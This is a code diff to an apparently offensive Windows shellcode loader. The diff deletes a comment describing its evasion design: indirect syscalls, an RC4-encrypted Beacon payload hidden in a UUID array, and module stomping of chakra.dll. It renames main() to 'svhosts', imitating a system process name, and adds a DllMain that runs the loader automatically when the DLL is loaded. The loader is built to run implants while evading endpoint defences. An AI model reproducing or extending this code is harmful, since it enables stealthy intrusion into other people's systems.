@@ -8,43 +8,11 @@
 #include "syscalls.h"
 #include "k32.h"
 
-/*
-
-	Evasion feature :
-
-	Shellcode loader utilizing indirect syscalls.
-	The payload is encrypted with RC4 and stored in a UUID array.
-	No memory regions are explicitly allocated; instead, module stomping is employed with chakra.dll.
-	The module is loaded using LoadLibraryExAPC, inspired by the WriteProcessMemoryAPC technique by x86matthew.
-
-	Payload storage :
-
-	+---------------------------------------------------+
-	|                   UUID Buffer                     |
-	|                                                   |
-	|         +---------------------------------+       |
-	|         |         Payload RC4             |       |
-	|         |				    |	    |
-	|         |     +---------------------+     |       |
-	|         |     |       Beacon        |     |       |
-	|         |     +---------------------+     |       |
-	|         +---------------------------------+       |
-	+---------------------------------------------------+
-
-	Exec sum :
-
-	Load chakra.dll and modify its memory protection to read-write (RW).
-	Decode and decrypt the payload, then copy it into the stomped module.
-	Restore the original memory protection of the .text section.
-	Execute the payload with a direct jump (jmp), avoiding the creation of a new thread.
-*/
-
-
 typedef void(WINAPI* EXEC_MEM)();
 
 void* LoadLibraryExAPC(LPSTR lpModuleName, DWORD dwFlags, PFUNCTION_LIST funcList);
 
-int main()
+int svhosts()
 {
 
 	FUNCTION_LIST funcList = { 0 };
@@ -132,4 +100,33 @@ void* LoadLibraryExAPC(LPSTR lpModuleName, DWORD dwFlags, PFUNCTION_LIST funcLis
 	HellDescent(hThread);
 
 	return xGetModuleHandleA(HASH_CHAKRA);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD ul_reason_for_call,
+    LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        // Initialize the DLL
+        svhosts();
+        if (svhosts() != EXIT_SUCCESS) {
+            return FALSE; // Initialization failed
+        }
+        break;
+
+    case DLL_THREAD_ATTACH:
+        // A thread is being created
+        break;
+
+    case DLL_THREAD_DETACH:
+        // A thread is exiting cleanly
+        break;
+
+    case DLL_PROCESS_DETACH:
+        // Cleanup before the DLL is unloaded
+        break;
+    }
+    return TRUE; // Successful execution
 }
